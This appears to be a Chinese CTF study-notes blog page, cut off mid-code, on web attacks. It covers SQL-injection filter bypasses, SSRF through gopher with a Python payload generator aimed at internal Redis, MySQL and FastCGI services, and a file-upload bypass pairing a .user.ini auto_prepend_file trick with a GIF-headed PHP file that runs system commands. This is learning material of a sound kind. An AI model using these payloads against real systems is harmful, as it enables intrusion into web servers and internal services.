<p>假设表t1中有一行包含（10）。如果表t2包含（-5,0，+5），则表达式为true，因为10比t2中的查出的所有三个值大。如果表t2包含（12,6，null，-100），则表达式为false，因为t2中有一个值12大于10。如果表t2包含（0，null，1），则表达式为unknown。如果t2为空表，则结果为true。</p>
<p>not in 是 “&lt;&gt;all”的别名，用法相同。<br>语句in 与“=any”是相同的。<br>例如：</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>语句some是any的别名，用法相同。<br>例如：</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h4 id="6-mysql-连接函数，-分组连接函数"><a href="#6-mysql-连接函数，-分组连接函数" class="headerlink" title="6.mysql 连接函数， 分组连接函数"></a>6.mysql 连接函数， 分组连接函数</h4><h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,…)</p>
<p>若有一个参数为NULL，返回NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(‘间隔符号’,str1,str2,…)</p>
<p><strong>间隔符号可以是空格，不能不写，否则返回为空</strong></p>
<p> 显示为   <u>str1间隔符号str2间隔符号str3…</u></p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] 字段名 [ order by 排序字段 asc/desc ] [separator “分隔符”])</p>
<p>多行数据在一行显示函数</p>
<p>根据group by指定的列进行排序分组，将同一组显示出来，并用分隔符间隔</p>
<h5 id="ps-组合使用"><a href="#ps-组合使用" class="headerlink" title="ps. 组合使用"></a>ps. 组合使用</h5><p>如果是多字段组合 显示在一行的eg：</p>
<p>group_concat(concat_ws(‘,’,concat(str1，str2) ) )；</p>
<p>一个字段的话eg：</p>
<p>group_concat(concat_ws(‘,’,str1，str2) )； </p>
<h4 id="7-过滤替换"><a href="#7-过滤替换" class="headerlink" title="*7.过滤替换"></a>*7.过滤替换</h4><h5 id="1）双写绕过"><a href="#1）双写绕过" class="headerlink" title="1）双写绕过"></a>1）双写绕过</h5><p>(用于把黑名单的字符替换成空)：se<u>select</u>lect,un<u>union</u>ion，oorr等等（替换为空后，剩余语句就是标准的sql语句，不会影响语句的正常执行）</p>
<p>ps.注意，有的语句命令可能会带有黑名单的字符，也需要双写，如<u>or</u>der,inf<u>or</u>mation.schema_schemata等，当网站在检查时，同样会被替换为空，所以需要写成o<u>or</u>rder,info<u>or</u>rmation.schema_schemata等等</p>
<h5 id="2）大小写混合"><a href="#2）大小写混合" class="headerlink" title="2）大小写混合"></a>2）大小写混合</h5><p>(用于黑名单中只有小写或大写，并没有对大小写进行区分)</p>
<p>如sEleCt,unIoN等等</p>
<h5 id="3）替换"><a href="#3）替换" class="headerlink" title="*3）替换"></a>*3）替换</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select：</span><br><span class="line"></span><br><span class="line">union：</span><br><span class="line"></span><br><span class="line">空格：%<span class="number">0</span>a（分隔符），() 【如select(table_name)from(xxx)】，&lt; &gt;， %<span class="number">20</span>(space), %<span class="number">09</span>(tab), $<span class="built_in">IFS</span>$<span class="number">9</span>（$<span class="built_in">IFS</span>是**Unix**系统的一个预设变量表示分隔符，$<span class="number">9</span>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</span><br><span class="line"></span><br><span class="line">=：like</span><br><span class="line"></span><br><span class="line"><span class="built_in">and</span>：&amp;&amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">or</span>：||</span><br></pre></td></tr></table></figure></div>



<h4 id="8-注释符"><a href="#8-注释符" class="headerlink" title="8. 注释符"></a>8. 注释符</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#、</span> <span class="literal">--+</span><span class="comment">、</span> <span class="literal">--</span><span class="comment">%20、 %23</span></span><br></pre></td></tr></table></figure></div>



<hr>
<h3 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h3><hr>
<h3 id="三、csrf"><a href="#三、csrf" class="headerlink" title="三、csrf"></a>三、csrf</h3><hr>
<h3 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h3><hr>
<h3 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h3><h4 id="gopher协议总结"><a href="#gopher协议总结" class="headerlink" title="gopher协议总结"></a>gopher协议总结</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121667791">原文</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60115503/article/details/124407499">另一篇推荐的文章</a></p>
<p>gopher协议是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面</p>
<h5 id="1-利用："><a href="#1-利用：" class="headerlink" title="1)利用："></a>1)利用：</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 <span class="meta">GET</span>、POST 请求</span><br></pre></td></tr></table></figure></div>



<p>gopher协议的格式：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IP数据流  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span><span class="regexp">/_POST /</span>flag.php HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="regexp">/*注意_符号*/</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有时候读取文件需要从网站本身的127.0.0.1发出请求</span><br><span class="line"></span><br><span class="line"><span class="section">/*可以利用file://伪协议用于读取本地文件*/</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line">比如</span><br><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>



<h5 id="2-GTE请求"><a href="#2-GTE请求" class="headerlink" title="2)GTE请求"></a>2)GTE请求</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造HTTP数据包</span><br><span class="line"></span><br><span class="line">URL编码、替换回车换行为<span class="meta">%</span><span class="number">0</span>d<span class="meta">%</span><span class="number">0</span>a，HTTP包最后加<span class="meta">%</span><span class="number">0</span>d<span class="meta">%</span><span class="number">0</span>a代表消息结束</span><br><span class="line"></span><br><span class="line">发送gopher协议, 协议后的IP一定要接端口</span><br></pre></td></tr></table></figure></div>



<h5 id="3-POST请求"><a href="#3-POST请求" class="headerlink" title="3)POST请求"></a>3)POST请求</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST与GET传参的区别：它有4个参数为必要参数</span><br><span class="line"></span><br><span class="line">需要传递</span><br><span class="line">Content-Type,</span><br><span class="line">Content-Length,</span><br><span class="line">host,</span><br><span class="line">post的参数</span><br><span class="line"></span><br><span class="line"><span class="code">----</span></span><br><span class="line"><span class="code">比如：</span></span><br><span class="line"><span class="code">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="code">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="code">Content-Length: 36</span></span><br><span class="line"><span class="code">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">key=51457bb0a50c1eb2c92dcc3ec3c2cc13        //post参数</span></span><br><span class="line"><span class="code">------</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**Host、Content-Type和Content-Length请求头是必不可少的，但在 GET请求中可以没有**</span></span><br><span class="line"><span class="strong">**切记：Content-Length 这个要和底下POST参数[比如例子中key=,4个+51457bb0a50c1eb2c92dcc3ec3c2cc13,32个，共计36个]长度一致**</span></span><br></pre></td></tr></table></figure></div>



<p>python脚本生成payload（POST和GTE请求都适用）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#对payload中的特殊字符进行编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFL漏洞</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># 对新增的部分继续编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<h5 id="构造一个提交文件的POST请求"><a href="#构造一个提交文件的POST请求" class="headerlink" title="构造一个提交文件的POST请求"></a>构造一个提交文件的POST请求</h5><p>首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">​</span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h5 id="gopher打FastCGI"><a href="#gopher打FastCGI" class="headerlink" title="gopher打FastCGI"></a>gopher打FastCGI</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121643002">看我这一篇</a></p>
<h5 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121667613">看我这一篇</a></p>
<h5 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h5><p>gopher打mysql，就是利用gopher协议传shell到mysql中。</p>
<p>首先Mysql存在三种连接方式</p>
<pre><code>Unix套接字；
内存共享/命名管道；
TCP/IP套接字；
</code></pre>
<p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
<pre><code>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证
当无需密码认证时直接发送TCP/IP数据包即可
</code></pre>
<p>这儿对localhost和127.0.0.1做一个区别</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">localhost也叫local ，正确的解释是：本地服务器。</span><br><span class="line"><span class="number">127.0.0.1</span>的正确解释是：本机地址（本机服务器），它的解析通过本机的host文件，windows自动将localhost解析为<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>。</span><br><span class="line">localhot（local）是不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制。<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>是通过网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制</span><br><span class="line">简单说</span><br><span class="line">当我们通过mysql -hlocalhost -uname去连接的时候，没有经过网卡，使用的是unix套接字连接，这种时候我们tcpdump是抓不到包的</span><br><span class="line">当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。</span><br><span class="line">mysql -h <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -uname</span><br></pre></td></tr></table></figure></div>

<p>我们平常打mysql最常用的就是打无密码的mysql</p>
<p>但是我们在用gopher还是需要用dict协议去得到mysql的端口(默认是3306)</p>
<p>直接使用的gopherus工具,直接快速生成payload<br><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
<hr>
<h3 id="六、文件上传"><a href="#六、文件上传" class="headerlink" title="六、文件上传"></a>六、文件上传</h3><h4 id="1-多重过滤绕过"><a href="#1-多重过滤绕过" class="headerlink" title="1.多重过滤绕过"></a>1.多重过滤绕过</h4><p><u><strong>下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式</strong></u></p>
<p>这里需要绕过的点如下</p>
<ul>
<li>检查文件内容是否有php字符串</li>
<li>检查后缀中是否有htaccess或ph</li>
<li>检查文件头部信息</li>
<li>文件MIME类型</li>
</ul>
<p>对于<u>第一点</u>可以利用<strong>短标签</strong>绕过，例如 <?=phpinfo();?></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">把short_open_tag 字段改为On，就可以实现短标签功能</span><br><span class="line"></span><br><span class="line">短标签：</span><br><span class="line"><span class="number">1</span>.能正常解析类似于这样形式的php文件： <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出，在短标签看来，<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">正确：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">从这个对比试验我们可以看出：</span><br><span class="line">在短标签模式下，</span><br><span class="line">我们执行php语句php函数，都用类似于这样形式的php文件：</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">但是我们要输出一个flag，或者变量时，使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出</span><br></pre></td></tr></table></figure></div>

<p>对于<u>第二点</u>可以通过上传**.user.ini**以及正常jpg文件来进行getshell,可以参考以下文章</p>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<p><u>第三点</u>绕过方式即在文件头部添加一个图片的<strong>文件头</strong>，比如<code>GIF89a</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ：FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(相当于文本的GIF89a)：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>： <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure></div>

<p><u>第四点</u>绕过方法即修改上传时的Content-Type</p>
<p>因此最终的payload为：<br> 上传.user.ini，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure></div>

<p>上传a.jpg，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2.文件类型"></a>2.文件类型</h4><p><img src="https://img-blog.csdnimg.cn/20200226180218842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFqaWF3ZWk=,size_16,color_FFFFFF,t_70" alt="img"></p>
<hr>
<h3 id="七、文件包含"><a href="#七、文件包含" class="headerlink" title="七、文件包含"></a>七、文件包含</h3><h4 id="1-文件包含的四个函数："><a href="#1-文件包含的四个函数：" class="headerlink" title="1.文件包含的四个函数："></a>1.文件包含的四个函数：</h4><p>1.include():将在其被调用的位置处包含一个文件。包含一个文件与在该语句所在位置复制制定文件的数据具有相同内容的效果。使用include()时可以忽略括号。</p>
<p>2.include_once():在脚本执行期间包含并运行指定文件。此行为和 include() 语句类似，<u><strong>唯一区别是include_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含。</strong></u></p>
<p>3.replace() :很大程度上与include相同，都是将一个模板文件包含到require调用坐在的位置。</p>
<p>require和include之间有两点重要的区别:</p>
<p>1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。<br>2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。</p>
<p>4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，<u><strong>唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含</strong></u></p>
<p><u><strong>下面是一篇关于require_once被使用后不能再使用怎么绕开的文章，本人在2022年5月校内Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
<p>下面为该题代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       